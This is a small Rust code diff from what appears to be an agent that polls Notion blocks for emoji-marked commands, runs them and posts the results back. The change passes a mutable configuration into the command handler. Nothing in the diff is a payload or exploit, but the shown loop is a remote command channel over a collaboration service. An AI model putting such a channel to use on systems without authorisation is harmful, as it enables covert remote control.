@@ -29,7 +29,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("Starting!");
     
     // Handle config options
-    let config_options: ConfigOptions;
+    let mut config_options: ConfigOptions;
 
     // Check for `-d` option
     match args().nth(1) {
@@ -97,7 +97,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                     if s.contains("🎯") {
                         println!("Got command: {}", s);
                         let notion_command = NotionCommand::from_string(s.replace("🎯",""))?;
-                        let output = notion_command.handle().await?;
+                        let output = notion_command.handle(&mut config_options).await?;
                         let command_block_id = block["id"].as_str().unwrap();
                         complete_command(&client, block.to_owned()).await;
                         send_result(&client, command_block_id, output).await;
